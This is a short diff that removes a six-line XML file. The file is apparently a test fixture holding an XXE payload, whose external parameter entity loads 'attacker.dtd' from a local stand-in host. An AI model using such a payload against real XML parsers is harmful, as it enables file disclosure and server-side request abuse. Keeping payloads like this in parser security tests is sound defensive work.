@@ -1,6 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE r [
-  <!ENTITY % sp SYSTEM "http://127.0.0.1:8080/attacker.dtd" >
-%sp;
-]>
-<r></r>
